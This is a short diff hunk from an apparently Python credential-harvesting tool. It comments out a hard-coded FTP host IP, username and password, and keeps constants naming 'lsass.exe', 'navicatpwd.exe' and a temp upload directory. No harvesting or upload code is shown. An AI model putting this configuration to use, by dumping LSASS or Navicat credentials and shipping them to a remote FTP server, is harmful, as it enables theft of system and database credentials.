@@ -11,9 +11,9 @@ tmp = tempfile.gettempdir()
 date = time.strftime("%d%m%Y_%H%M%S") + ".tmp"
 
 class constant():
-    ftp_host  = '119.29.205.214'
-    ftp_password = 'e7t65s'
-    ftp_username = 'test1'
+    # ftp_host  = '119.29.205.214'
+    # ftp_password = 'e7t65s'
+    # ftp_username = 'test1'
     lsass_name = "lsass.exe"
     Navicat = 'navicatpwd.exe'
     upload_dir = tempfile.gettempdir() + os.sep + date
